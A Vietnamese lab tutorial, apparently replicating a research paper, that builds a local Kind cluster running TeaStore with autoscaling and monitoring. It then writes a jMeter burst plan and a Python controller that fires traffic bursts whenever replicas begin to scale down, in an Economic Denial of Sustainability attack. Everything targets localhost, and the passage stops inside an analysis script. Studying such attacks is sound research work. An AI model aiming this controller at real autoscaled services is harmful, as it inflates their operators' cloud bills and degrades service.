# Hướng Dẫn Mô Phỏng EDoS Attack trên Kind — Windows 11

> **Điều kiện tiên quyết:** Docker Desktop và Kind đã cài đặt.

---

## Bước 1: Kiểm tra môi trường & cài thêm công cụ

Mở **PowerShell** (Run as Administrator):

```powershell
# Kiểm tra Docker và Kind
docker version
kind version

# Kiểm tra kubectl (Docker Desktop thường đi kèm)
kubectl version --client
```

### 1.1 Cài kubectl (nếu chưa có)

```powershell
# Dùng winget
winget install Kubernetes.kubectl

# Hoặc download trực tiếp
curl.exe -LO "https://dl.k8s.io/release/v1.31.0/bin/windows/amd64/kubectl.exe"
Move-Item kubectl.exe C:\Windows\System32\
```

### 1.2 Cài Helm

```powershell
winget install Helm.Helm

# Kiểm tra
helm version
```

### 1.3 Cài Python (cho analysis scripts)

```powershell
# Nếu chưa có Python
winget install Python.Python.3.12

# Cài thư viện cần thiết
pip install requests pandas matplotlib numpy
```

### 1.4 Cài Apache jMeter

```powershell
# Cài Java trước (nếu chưa có)
winget install Oracle.JDK.21

# Download jMeter
Invoke-WebRequest -Uri "https://archive.apache.org/dist/jmeter/binaries/apache-jmeter-5.6.3.zip" -OutFile "$env:USERPROFILE\Downloads\jmeter.zip"

# Giải nén
Expand-Archive "$env:USERPROFILE\Downloads\jmeter.zip" -DestinationPath "D:\Tools"

# Thêm vào PATH (chạy trong PowerShell Admin)
[Environment]::SetEnvironmentVariable("Path", $env:Path + ";D:\Tools\apache-jmeter-5.6.3\bin", "User")

# Đóng và mở lại PowerShell, kiểm tra
jmeter --version
```

### 1.5 Cấu hình Docker Desktop

Mở Docker Desktop → Settings → Resources:

| Tham số | Khuyến nghị |
|---------|-------------|
| CPUs    | 6+ (tối thiểu 4) |
| Memory  | 12 GB+ (tối thiểu 8 GB) |
| Swap    | 2 GB |
| Disk    | 40 GB |

**Quan trọng:** Apply & Restart Docker Desktop sau khi thay đổi.

---

## Bước 2: Tạo thư mục project

```powershell
mkdir C:\edos-demo
cd C:\edos-demo
mkdir results
```

---

## Bước 3: Tạo Kind Cluster

### 3.1 Tạo file cấu hình

Tạo file `C:\edos-demo\kind-config.yaml`:

```powershell

kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: edos-cluster
nodes:
  - role: control-plane
    extraPortMappings:
      # TeaStore WebUI
      - containerPort: 30080
        hostPort: 8080
        protocol: TCP
      # Grafana
      - containerPort: 30030
        hostPort: 3000
        protocol: TCP
      # Prometheus
      - containerPort: 30090
        hostPort: 9090
        protocol: TCP
  - role: worker
  - role: worker
  - role: worker

```

### 3.2 Tạo cluster

```powershell
kind create cluster --config kind-config.yaml

# Chờ khoảng 2-3 phút, sau đó kiểm tra
kubectl cluster-info
kubectl get nodes
```

**Kết quả mong đợi:**

```
NAME                         STATUS   ROLES           AGE
edos-cluster-control-plane   Ready    control-plane   2m
edos-cluster-worker          Ready    <none>          1m
edos-cluster-worker2         Ready    <none>          1m
edos-cluster-worker3         Ready    <none>          1m
```

> **Lỗi thường gặp:** Nếu bị `port already in use`, đổi hostPort trong config hoặc tắt ứng dụng đang dùng port đó.

### 3.3 Tạo namespaces

```powershell
kubectl create namespace teastore
kubectl create namespace monitoring
```

---

## Bước 4: Deploy Metrics Server

HPA cần Metrics Server để đọc CPU utilization.

```powershell
# Deploy Metrics Server
kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml

# Patch cho Kind (Kind dùng self-signed certs)
Mở cmd

cd project

echo [{"op":"add","path":"/spec/template/spec/containers/0/args/-","value":"--kubelet-insecure-tls"},{"op":"add","path":"/spec/template/spec/containers/0/args/-","value":"--kubelet-preferred-address-types=InternalIP"}] > patch.json

kubectl patch deployment metrics-server -n kube-system --type=json --patch-file=patch.json

# Chờ 1-2 phút, kiểm tra
kubectl get pods -n kube-system | findstr metrics
kubectl top nodes
```

**Nếu `kubectl top nodes` trả về số liệu CPU/Memory → thành công.**

---

## Bước 5: Deploy TeaStore Microservices

### 5.1 Tạo file deployment

Tạo file `C:\edos-demo\teastore.yaml`:

```powershell
@"
# === DATABASE ===
apiVersion: apps/v1
kind: Deployment
metadata:
  name: teastore-db
  namespace: teastore
spec:
  replicas: 1
  selector:
    matchLabels:
      app: teastore-db
  template:
    metadata:
      labels:
        app: teastore-db
    spec:
      containers:
        - name: db
          image: descartesresearch/teastore-db:latest
          ports:
            - containerPort: 3306
          resources:
            requests:
              cpu: 200m
              memory: 256Mi
            limits:
              cpu: 400m
              memory: 512Mi
---
apiVersion: v1
kind: Service
metadata:
  name: teastore-db
  namespace: teastore
spec:
  selector:
    app: teastore-db
  ports:
    - port: 3306
      targetPort: 3306
---
# === REGISTRY ===
apiVersion: apps/v1
kind: Deployment
metadata:
  name: teastore-registry
  namespace: teastore
spec:
  replicas: 1
  selector:
    matchLabels:
      app: teastore-registry
  template:
    metadata:
      labels:
        app: teastore-registry
    spec:
      containers:
        - name: registry
          image: descartesresearch/teastore-registry:latest
          ports:
            - containerPort: 8080
          resources:
            requests:
              cpu: 150m
              memory: 256Mi
            limits:
              cpu: 300m
              memory: 512Mi
---
apiVersion: v1
kind: Service
metadata:
  name: teastore-registry
  namespace: teastore
spec:
  selector:
    app: teastore-registry
  ports:
    - port: 8080
      targetPort: 8080
---
# === PERSISTENCE ===
apiVersion: apps/v1
kind: Deployment
metadata:
  name: teastore-persistence
  namespace: teastore
spec:
  replicas: 1
  selector:
    matchLabels:
      app: teastore-persistence
  template:
    metadata:
      labels:
        app: teastore-persistence
    spec:
      containers:
        - name: persistence
          image: descartesresearch/teastore-persistence:latest
          ports:
            - containerPort: 8080
          env:
            - name: HOST_NAME
              value: teastore-persistence
            - name: REGISTRY_HOST
              value: teastore-registry
            - name: REGISTRY_PORT
              value: "8080"
            - name: DB_HOST
              value: teastore-db
            - name: DB_PORT
              value: "3306"
          resources:
            requests:
              cpu: 200m
              memory: 256Mi
            limits:
              cpu: 400m
              memory: 512Mi
---
apiVersion: v1
kind: Service
metadata:
  name: teastore-persistence
  namespace: teastore
spec:
  selector:
    app: teastore-persistence
  ports:
    - port: 8080
      targetPort: 8080
---
# === AUTH ===
apiVersion: apps/v1
kind: Deployment
metadata:
  name: teastore-auth
  namespace: teastore
spec:
  replicas: 1
  selector:
    matchLabels:
      app: teastore-auth
  template:
    metadata:
      labels:
        app: teastore-auth
    spec:
      containers:
        - name: auth
          image: descartesresearch/teastore-auth:latest
          ports:
            - containerPort: 8080
          env:
            - name: HOST_NAME
              value: teastore-auth
            - name: REGISTRY_HOST
              value: teastore-registry
            - name: REGISTRY_PORT
              value: "8080"
          resources:
            requests:
              cpu: 200m
              memory: 256Mi
            limits:
              cpu: 400m
              memory: 512Mi
---
apiVersion: v1
kind: Service
metadata:
  name: teastore-auth
  namespace: teastore
spec:
  selector:
    app: teastore-auth
  ports:
    - port: 8080
      targetPort: 8080
---
# === RECOMMENDER ===
apiVersion: apps/v1
kind: Deployment
metadata:
  name: teastore-recommender
  namespace: teastore
spec:
  replicas: 1
  selector:
    matchLabels:
      app: teastore-recommender
  template:
    metadata:
      labels:
        app: teastore-recommender
    spec:
      containers:
        - name: recommender
          image: descartesresearch/teastore-recommender:latest
          ports:
            - containerPort: 8080
          env:
            - name: HOST_NAME
              value: teastore-recommender
            - name: REGISTRY_HOST
              value: teastore-registry
            - name: REGISTRY_PORT
              value: "8080"
          resources:
            requests:
              cpu: 150m
              memory: 256Mi
            limits:
              cpu: 300m
              memory: 512Mi
---
apiVersion: v1
kind: Service
metadata:
  name: teastore-recommender
  namespace: teastore
spec:
  selector:
    app: teastore-recommender
  ports:
    - port: 8080
      targetPort: 8080
---
# === IMAGE ===
apiVersion: apps/v1
kind: Deployment
metadata:
  name: teastore-image
  namespace: teastore
spec:
  replicas: 1
  selector:
    matchLabels:
      app: teastore-image
  template:
    metadata:
      labels:
        app: teastore-image
    spec:
      containers:
        - name: image
          image: descartesresearch/teastore-image:latest
          ports:
            - containerPort: 8080
          env:
            - name: HOST_NAME
              value: teastore-image
            - name: REGISTRY_HOST
              value: teastore-registry
            - name: REGISTRY_PORT
              value: "8080"
          resources:
            requests:
              cpu: 200m
              memory: 256Mi
            limits:
              cpu: 400m
              memory: 512Mi
---
apiVersion: v1
kind: Service
metadata:
  name: teastore-image
  namespace: teastore
spec:
  selector:
    app: teastore-image
  ports:
    - port: 8080
      targetPort: 8080
---
# === WEBUI (component chính, chịu tải nhiều nhất) ===
apiVersion: apps/v1
kind: Deployment
metadata:
  name: teastore-webui
  namespace: teastore
spec:
  replicas: 1
  selector:
    matchLabels:
      app: teastore-webui
  template:
    metadata:
      labels:
        app: teastore-webui
    spec:
      containers:
        - name: webui
          image: descartesresearch/teastore-webui:latest
          ports:
            - containerPort: 8080
          env:
            - name: HOST_NAME
              value: teastore-webui
            - name: REGISTRY_HOST
              value: teastore-registry
            - name: REGISTRY_PORT
              value: "8080"
          resources:
            requests:
              cpu: 250m
              memory: 256Mi
            limits:
              cpu: 500m
              memory: 512Mi
---
apiVersion: v1
kind: Service
metadata:
  name: teastore-webui
  namespace: teastore
spec:
  type: NodePort
  selector:
    app: teastore-webui
  ports:
    - port: 8080
      targetPort: 8080
      nodePort: 30080
"@ | Out-File -Encoding utf8 teastore.yaml
```

### 5.2 Deploy và chờ ready

```powershell
kubectl apply -f teastore.yaml

# Theo dõi pods khởi động (mất 3-5 phút để pull images lần đầu)
kubectl get pods -n teastore -w
```

**Chờ đến khi tất cả pods ở trạng thái `Running` và `READY 1/1`.**

> **Mẹo:** Lần đầu pull image sẽ lâu (~2-5 phút mỗi image). Các lần sau sẽ nhanh hơn nhiều.

### 5.3 Kiểm tra TeaStore

```powershell
# Kiểm tra qua curl
curl.exe http://localhost:8080/tools.descartes.teastore.webui/
```

Mở browser tại: **http://localhost:8080/tools.descartes.teastore.webui/**

Nếu thấy trang web TeaStore → thành công.

> **Lỗi thường gặp:** Nếu trang không load, kiểm tra `kubectl logs -n teastore deployment/teastore-webui`. Thường do persistence chưa init xong database → chờ thêm 1-2 phút.

---

## Bước 6: Cấu hình HPA (Horizontal Pod Autoscaler)

### 6.1 Tạo file HPA

Tạo file `C:\edos-demo\hpa.yaml`:

```powershell
@"
# HPA cho WebUI - component chính chịu tải
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: hpa-webui
  namespace: teastore
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: teastore-webui
  minReplicas: 1
  maxReplicas: 6
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 80
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 30
      policies:
        - type: Pods
          value: 1
          periodSeconds: 30
    scaleDown:
      stabilizationWindowSeconds: 120
      policies:
        - type: Pods
          value: 1
          periodSeconds: 60
---
# HPA cho Auth
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: hpa-auth
  namespace: teastore
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: teastore-auth
  minReplicas: 1
  maxReplicas: 4
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 80
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 30
      policies:
        - type: Pods
          value: 1
          periodSeconds: 30
    scaleDown:
      stabilizationWindowSeconds: 120
      policies:
        - type: Pods
          value: 1
          periodSeconds: 60
---
# HPA cho Image
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: hpa-image
  namespace: teastore
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: teastore-image
  minReplicas: 1
  maxReplicas: 4
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 80
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 30
      policies:
        - type: Pods
          value: 1
          periodSeconds: 30
    scaleDown:
      stabilizationWindowSeconds: 120
      policies:
        - type: Pods
          value: 1
          periodSeconds: 60
---
# HPA cho Persistence
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: hpa-persistence
  namespace: teastore
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: teastore-persistence
  minReplicas: 1
  maxReplicas: 4
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 80
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 30
      policies:
        - type: Pods
          value: 1
          periodSeconds: 30
    scaleDown:
      stabilizationWindowSeconds: 120
      policies:
        - type: Pods
          value: 1
          periodSeconds: 60
"@ | Out-File -Encoding utf8 hpa.yaml
```

### 6.2 Apply HPA

```powershell
kubectl apply -f hpa.yaml

# Kiểm tra (cột TARGETS sẽ hiển thị % CPU hiện tại)
kubectl get hpa -n teastore
```

**Kết quả mong đợi:**

```
NAME              REFERENCE                    TARGETS   MINPODS   MAXPODS   REPLICAS
hpa-webui         Deployment/teastore-webui    12%/80%   1         6         1
hpa-auth          Deployment/teastore-auth     5%/80%    1         4         1
hpa-image         Deployment/teastore-image    8%/80%    1         4         1
hpa-persistence   Deployment/teastore-persi    10%/80%   1         4         1
```

> Nếu TARGETS hiển thị `<unknown>/80%`, chờ 1-2 phút cho Metrics Server thu thập dữ liệu.

---

## Bước 7: Deploy Monitoring (Prometheus + Grafana)

### 7.1 Thêm Helm repo

```powershell
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update
```

### 7.2 Tạo file cấu hình

Tạo file `C:\edos-demo\monitoring-values.yaml`:

```powershell
@"
prometheus:
  service:
    type: NodePort
    nodePort: 30090
  prometheusSpec:
    serviceMonitorSelectorNilUsesHelmValues: false
    podMonitorSelectorNilUsesHelmValues: false
    scrapeInterval: 15s
    retention: 12h
    resources:
      requests:
        cpu: 200m
        memory: 256Mi
      limits:
        cpu: 500m
        memory: 512Mi

grafana:
  service:
    type: NodePort
    nodePort: 30030
  adminPassword: edos-demo
  resources:
    requests:
      cpu: 100m
      memory: 128Mi
    limits:
      cpu: 200m
      memory: 256Mi

alertmanager:
  enabled: false

nodeExporter:
  enabled: true

kubeStateMetrics:
  enabled: true

prometheusOperator:
  resources:
    requests:
      cpu: 100m
      memory: 128Mi
    limits:
      cpu: 200m
      memory: 256Mi
"@ | Out-File -Encoding utf8 monitoring-values.yaml
```

### 7.3 Deploy

```powershell
helm install monitoring prometheus-community/kube-prometheus-stack `
  -n monitoring `
  -f monitoring-values.yaml `
  --wait --timeout 10m

# Kiểm tra
kubectl get pods -n monitoring
```

### 7.4 Truy cập

- **Grafana:** http://localhost:3000 → user `admin` / password `edos-demo`
- **Prometheus:** http://localhost:9090

### 7.5 Test Prometheus query

Mở http://localhost:9090 → gõ query sau và nhấn Execute:

```promql
sum(kube_deployment_status_replicas{namespace="teastore"})
```

Nếu trả về số (ví dụ `7`) → Prometheus đang hoạt động tốt.

---

## Bước 8: Tạo Traffic Generator (jMeter)

### 8.1 Legitimate Traffic — Random Pattern

Tạo file `C:\edos-demo\legitimate-random.jmx`:

```powershell
@"
<?xml version="1.0" encoding="UTF-8"?>
<jmeterTestPlan version="1.2" properties="5.0">
  <hashTree>
    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="Legitimate Random Traffic"/>
    <hashTree>
      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="Users">
        <intProp name="ThreadGroup.num_threads">20</intProp>
        <intProp name="ThreadGroup.ramp_time">30</intProp>
        <boolProp name="ThreadGroup.scheduler">true</boolProp>
        <stringProp name="ThreadGroup.duration">1800</stringProp>
        <elementProp name="ThreadGroup.main_controller" elementType="LoopController">
          <boolProp name="LoopController.continue_forever">true</boolProp>
          <intProp name="LoopController.loops">-1</intProp>
        </elementProp>
      </ThreadGroup>
      <hashTree>
        <PoissonRandomTimer guiclass="PoissonRandomTimerGui" testclass="PoissonRandomTimer" testname="Poisson Timer">
          <stringProp name="ConstantTimer.delay">100</stringProp>
          <stringProp name="RandomTimer.range">200</stringProp>
        </PoissonRandomTimer>
        <hashTree/>
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Homepage">
          <stringProp name="HTTPSampler.domain">localhost</stringProp>
          <stringProp name="HTTPSampler.port">8080</stringProp>
          <stringProp name="HTTPSampler.path">/tools.descartes.teastore.webui/</stringProp>
          <stringProp name="HTTPSampler.method">GET</stringProp>
        </HTTPSamplerProxy>
        <hashTree/>
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Category">
          <stringProp name="HTTPSampler.domain">localhost</stringProp>
          <stringProp name="HTTPSampler.port">8080</stringProp>
          <stringProp name="HTTPSampler.path">/tools.descartes.teastore.webui/category?category=2&amp;page=1</stringProp>
          <stringProp name="HTTPSampler.method">GET</stringProp>
        </HTTPSamplerProxy>
        <hashTree/>
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Product">
          <stringProp name="HTTPSampler.domain">localhost</stringProp>
          <stringProp name="HTTPSampler.port">8080</stringProp>
          <stringProp name="HTTPSampler.path">/tools.descartes.teastore.webui/product?id=7</stringProp>
          <stringProp name="HTTPSampler.method">GET</stringProp>
        </HTTPSamplerProxy>
        <hashTree/>
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Login">
          <stringProp name="HTTPSampler.domain">localhost</stringProp>
          <stringProp name="HTTPSampler.port">8080</stringProp>
          <stringProp name="HTTPSampler.path">/tools.descartes.teastore.webui/loginAction?username=user2&amp;password=password</stringProp>
          <stringProp name="HTTPSampler.method">POST</stringProp>
        </HTTPSamplerProxy>
        <hashTree/>
        <ResultCollector guiclass="SummaryReport" testclass="ResultCollector" testname="Summary">
          <stringProp name="filename">C:\edos-demo\results\legitimate-random.jtl</stringProp>
        </ResultCollector>
        <hashTree/>
      </hashTree>
    </hashTree>
  </hashTree>
</jmeterTestPlan>
"@ | Out-File -Encoding utf8 legitimate-random.jmx
```

### 8.2 Attack Burst Traffic

Tạo file `C:\edos-demo\attacker-burst.jmx`:

```powershell
@"
<?xml version="1.0" encoding="UTF-8"?>
<jmeterTestPlan version="1.2" properties="5.0">
  <hashTree>
    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="EDoS Attack Burst"/>
    <hashTree>
      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="Attack">
        <stringProp name="ThreadGroup.num_threads">`${__P(THREADS,100)}</stringProp>
        <intProp name="ThreadGroup.ramp_time">5</intProp>
        <boolProp name="ThreadGroup.scheduler">true</boolProp>
        <stringProp name="ThreadGroup.duration">`${__P(DURATION,120)}</stringProp>
        <elementProp name="ThreadGroup.main_controller" elementType="LoopController">
          <boolProp name="LoopController.continue_forever">true</boolProp>
          <intProp name="LoopController.loops">-1</intProp>
        </elementProp>
      </ThreadGroup>
      <hashTree>
        <ConstantTimer guiclass="ConstantTimerGui" testclass="ConstantTimer" testname="Fast">
          <stringProp name="ConstantTimer.delay">50</stringProp>
        </ConstantTimer>
        <hashTree/>
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Attack-Home">
          <stringProp name="HTTPSampler.domain">localhost</stringProp>
          <stringProp name="HTTPSampler.port">8080</stringProp>
          <stringProp name="HTTPSampler.path">/tools.descartes.teastore.webui/</stringProp>
          <stringProp name="HTTPSampler.method">GET</stringProp>
        </HTTPSamplerProxy>
        <hashTree/>
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Attack-Category">
          <stringProp name="HTTPSampler.domain">localhost</stringProp>
          <stringProp name="HTTPSampler.port">8080</stringProp>
          <stringProp name="HTTPSampler.path">/tools.descartes.teastore.webui/category?category=2&amp;page=1</stringProp>
          <stringProp name="HTTPSampler.method">GET</stringProp>
        </HTTPSamplerProxy>
        <hashTree/>
        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Attack-Product">
          <stringProp name="HTTPSampler.domain">localhost</stringProp>
          <stringProp name="HTTPSampler.port">8080</stringProp>
          <stringProp name="HTTPSampler.path">/tools.descartes.teastore.webui/product?id=7</stringProp>
          <stringProp name="HTTPSampler.method">GET</stringProp>
        </HTTPSamplerProxy>
        <hashTree/>
      </hashTree>
    </hashTree>
  </hashTree>
</jmeterTestPlan>
"@ | Out-File -Encoding utf8 attacker-burst.jmx
```

---

## Bước 9: Tạo Attacker Controller (Python)

Đây là bộ não của attacker — theo dõi hệ thống qua Prometheus và quyết định khi nào gửi burst.

Tạo file `C:\edos-demo\attacker_controller.py`:

```python
#!/usr/bin/env python3
"""
EDoS Attacker Controller cho Windows.
Theo doi so replicas qua Prometheus, gui burst khi phat hien scale-down.
"""

import subprocess
import requests
import time
import csv
import os
import sys
import signal
from datetime import datetime

# === CAU HINH ===
PROMETHEUS_URL = "http://localhost:9090"
JMETER_CMD = r"C:\Tools\apache-jmeter-5.6.3\bin\jmeter.bat"  # Sua lai neu khac

ATTACK_POWER_K = 5
SU_THRESHOLD = 3
BURST_DURATION_SEC = 120
CHECK_INTERVAL_SEC = 15
ATTACK_WINDOW_SEC = 1800

LEGIT_THREADS = 20
ATTACK_THREADS = LEGIT_THREADS * ATTACK_POWER_K

# === TRANG THAI ===
attack_log = []
previous_su_count = 0
attack_active = False
attack_process = None
total_attack_cycles = 0


def get_current_su():
    """Query Prometheus lay tong so replicas."""
    query = 'sum(kube_deployment_status_replicas{namespace="teastore"})'
    try:
        resp = requests.get(
            f"{PROMETHEUS_URL}/api/v1/query",
            params={"query": query}, timeout=5
        )
        data = resp.json()
        if data["status"] == "success" and data["data"]["result"]:
            return int(float(data["data"]["result"][0]["value"][1]))
    except Exception as e:
        print(f"[WARN] Prometheus error: {e}")
    return -1


def start_burst():
    """Khoi dong jMeter attack burst."""
    global attack_process, attack_active, total_attack_cycles
    result_file = os.path.join("results", f"attack-{total_attack_cycles}.jtl")
    cmd = [
        JMETER_CMD, "-n",
        "-t", "attacker-burst.jmx",
        f"-JTHREADS={ATTACK_THREADS}",
        f"-JDURATION={BURST_DURATION_SEC}",
        "-l", result_file
    ]
    print(f"[ATTACK] Burst #{total_attack_cycles+1}: "
          f"{ATTACK_THREADS} threads x {BURST_DURATION_SEC}s")
    attack_process = subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    attack_active = True
    total_attack_cycles += 1


def stop_burst():
    """Dung jMeter attack."""
    global attack_process, attack_active
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        try:
            attack_process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            attack_process.kill()
    attack_active = False
    print("[ATTACK] Burst ket thuc")


def should_attack(current, previous):
    """Quyet dinh co nen attack khong."""
    if current >= SU_THRESHOLD and current < previous:
        return True, "SU giam & >= nguong"
    if current >= SU_THRESHOLD and current >= previous:
        return True, "SU cao & on dinh"
    return False, "Khong du dieu kien"


def log_state(ts, su, action, reason):
    entry = {
        "timestamp": ts.isoformat(),
        "total_su": su,
        "action": action,
        "reason": reason,
        "K": ATTACK_POWER_K
    }
    attack_log.append(entry)
    print(f"[{ts.strftime('%H:%M:%S')}] SU={su} | {action} | {reason}")


def save_logs():
    os.makedirs("results", exist_ok=True)
    fname = f"results\\attack_log_K{ATTACK_POWER_K}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(fname, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=["timestamp","total_su","action","reason","K"])
        w.writeheader()
        w.writerows(attack_log)
    print(f"\n[SAVE] Log: {fname}")
    print(f"[SAVE] Total bursts: {total_attack_cycles}")
    frac = (total_attack_cycles * BURST_DURATION_SEC) / ATTACK_WINDOW_SEC
    print(f"[SAVE] frac_attack = {frac:.3f}")


def main():
    global previous_su_count, ATTACK_POWER_K, ATTACK_THREADS

    if len(sys.argv) > 1:
        ATTACK_POWER_K = int(sys.argv[1])
        ATTACK_THREADS = LEGIT_THREADS * ATTACK_POWER_K

    print("=" * 55)
    print(f"  EDoS Attacker | K={ATTACK_POWER_K} | "
          f"Threads={ATTACK_THREADS} | Threshold={SU_THRESHOLD}")
    print("=" * 55)

    # Cho Prometheus
    print("[INIT] Connecting to Prometheus...")
    while get_current_su() == -1:
        time.sleep(5)

    previous_su_count = get_current_su()
    start_time = datetime.now()
    burst_end = 0

    print(f"[START] SU={previous_su_count} at {start_time.strftime('%H:%M:%S')}")

    try:
        while True:
            elapsed = (datetime.now() - start_time).total_seconds()
            if elapsed > ATTACK_WINDOW_SEC:
                print("[END] Attack window het")
                break

            su = get_current_su()
            now = datetime.now()
            if su == -1:
                time.sleep(CHECK_INTERVAL_SEC)
                continue

            if attack_active:
                if time.time() > burst_end:
                    stop_burst()
                    log_state(now, su, "BURST_END", "Het thoi gian")
                else:
                    log_state(now, su, "ATTACKING", "Burst dang chay")
                    time.sleep(CHECK_INTERVAL_SEC)
                    previous_su_count = su
                    continue

            do_attack, reason = should_attack(su, previous_su_count)
            if do_attack and not attack_active:
                log_state(now, su, "LAUNCH", reason)
                start_burst()
                burst_end = time.time() + BURST_DURATION_SEC
            else:
                log_state(now, su, "IDLE", reason)

            previous_su_count = su
            time.sleep(CHECK_INTERVAL_SEC)

    except KeyboardInterrupt:
        print("\n[STOP] Ctrl+C")

    if attack_active:
        stop_burst()
    save_logs()


if __name__ == "__main__":
    main()
```

---

## Bước 10: Chạy thí nghiệm

Mở **3 cửa sổ PowerShell** riêng biệt:

### Terminal 1: Theo dõi HPA (để mở suốt quá trình)

```powershell
cd C:\edos-demo

# Theo doi HPA real-time (cap nhat moi 5 giay)
while ($true) {
    Clear-Host
    Write-Host "=== $(Get-Date -Format 'HH:mm:ss') ===" -ForegroundColor Cyan
    kubectl get hpa -n teastore
    Write-Host ""
    kubectl get pods -n teastore
    Start-Sleep 5
}
```

### Terminal 2: Chạy Legitimate Traffic (baseline)

```powershell
cd C:\edos-demo

# Chay baseline 30 phut
jmeter -n -t legitimate-random.jmx -l results\baseline.jtl
```

**Chờ khoảng 5 phút** để traffic ổn định, quan sát Terminal 1: CPU% tăng dần, có thể thấy replicas tăng nếu CPU > 80%.

### Terminal 3: Chạy Attacker (sau khi baseline ổn định)

```powershell
cd C:\edos-demo

# Chay attacker voi K=5
python attacker_controller.py 5
```

**Quan sát Terminal 1:** Bạn sẽ thấy replicas tăng lên khi attacker gửi burst, và cố gắng giảm xuống khi burst kết thúc — nhưng attacker sẽ gửi burst mới ngay khi phát hiện scale-down.

### Chạy với các K khác nhau

```powershell
# Sau khi K=5 xong, reset cluster
kubectl scale deployment --all --replicas=1 -n teastore
Start-Sleep 120   # Cho HPA on dinh

# Chay K=10
python attacker_controller.py 10
```

---

## Bước 11: Thu thập & phân tích kết quả

### 11.1 Thu thập SU metrics

Tạo file `C:\edos-demo\collect_metrics.py`:

```python
"""Thu thap SU metrics tu Prometheus."""
import requests, csv, sys
from datetime import datetime, timedelta

PROMETHEUS = "http://localhost:9090"

def collect(minutes=30, outfile="results\\su_data.csv"):
    end = datetime.utcnow()
    start = end - timedelta(minutes=minutes)

    resp = requests.get(f"{PROMETHEUS}/api/v1/query_range", params={
        "query": 'sum(kube_deployment_status_replicas{namespace="teastore"})',
        "start": start.isoformat() + "Z",
        "end": end.isoformat() + "Z",
        "step": "60s"
    })
    data = resp.json()

    with open(outfile, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["timestamp", "minute", "total_su"])
        if data["status"] == "success":
            for r in data["data"]["result"]:
                for ts, val in r["values"]:
                    dt = datetime.utcfromtimestamp(ts)
                    m = (dt - start).total_seconds() / 60
                    w.writerow([dt.isoformat(), f"{m:.1f}", val])
    print(f"[OK] Saved to {outfile}")

if __name__ == "__main__":
    mins = int(sys.argv[1]) if len(sys.argv) > 1 else 30
    out = sys.argv[2] if len(sys.argv) > 2 else "results\\su_data.csv"
    collect(mins, out)
```

```powershell
# Thu thap 30 phut baseline
python collect_metrics.py 30 results\baseline_su.csv

# Thu thap 30 phut attack K=5
python collect_metrics.py 30 results\attack_K5_su.csv
```

### 11.2 Phân tích billing và efficiency

Tạo file `C:\edos-demo\analyze.py`:

```python
"""Phan tich billing va attack efficiency theo bai bao."""
import csv, sys
import numpy as np

def load(csvfile):
    sus = []
    with open(csvfile) as f:
        for row in csv.DictReader(f):
            sus.append(float(row["total_su"]))
    return np.array(sus)

def billing(sus, label=""):
    per_min = np.mean(sus)
    per_hr_max = np.max(sus)
    per_hr_mean = np.mean(sus)
    print(f"\n{'='*50}")
    print(f"  {label}")
    print(f"{'='*50}")
    print(f"  Per-Minute Avg:   {per_min:.4f} SUs")
    print(f"  Per-Hour Max:     {per_hr_max:.0f} SUs")
    print(f"  Per-Hour Mean:    {per_hr_mean:.4f} SUs")
    return {"per_min": per_min, "per_hr_max": per_hr_max, "per_hr_mean": per_hr_mean}

def efficiency(base, attack, K, frac):
    print(f"\n{'='*50}")
    print(f"  Efficiency (K={K}, frac={frac:.3f})")
    print(f"{'='*50}")
    for mode in ["per_min", "per_hr_max", "per_hr_mean"]:
        eff = (attack[mode] - base[mode]) / (K * frac) if K * frac > 0 else 0
        print(f"  {mode:15s}:  Eff = {eff:.4f}  "
              f"(attack={attack[mode]:.2f}, base={base[mode]:.2f})")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python analyze.py baseline.csv")
        print("  python analyze.py baseline.csv attack.csv K frac_attack")
        sys.exit(1)

    base_sus = load(sys.argv[1])
    b = billing(base_sus, "Baseline")

    if len(sys.argv) >= 5:
        atk_sus = load(sys.argv[2])
        K = int(sys.argv[3])
        frac = float(sys.argv[4])
